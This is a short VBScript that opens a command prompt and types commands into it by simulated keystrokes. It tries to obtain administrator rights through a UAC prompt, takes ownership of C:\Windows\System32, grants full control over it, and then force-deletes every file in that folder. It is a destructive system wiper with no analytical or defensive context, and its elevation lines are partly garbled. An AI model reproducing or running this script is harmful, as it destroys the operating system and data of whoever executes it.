Set WshShell = WScript.CreateObject("WScript.Shell")

WshShell.Run "cmd"

WScript.Sleep 100

WshShell.SendKeys "net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else ( set admin=0)" 

WScript.Sleep 300


Wshshell.SendKeys "{ENTER}"

WScript.Sleep 200

WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 >> %temp%\getadmin.vbstemp%\getadmin.vbs del %temp%\getadmin.vbs exit /b"

WScript.Sleep 100
Wshshell.SendKeys "{ENTER}"

WScript.Sleep 100


 WshShell.SendKeys "if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0 REM If not running with admin privileges, elevate" 

WScript.Sleep 100

Wshshell.SendKeys "{ENTER}"

WScript.Sleep 100

WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"

WScript.Sleep 200

WshShell.SendKeys "{ENTER}"

WScript.Sleep 100


WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"

WScript.Sleep 100

WshShell.SendKeys "{ENTER}" 


WScript.Sleep 100

WshShell.SendKeys "cd C:\Windows\System32"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100 


WshShell.SendKeys "del /F /S /Q *.*"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 200
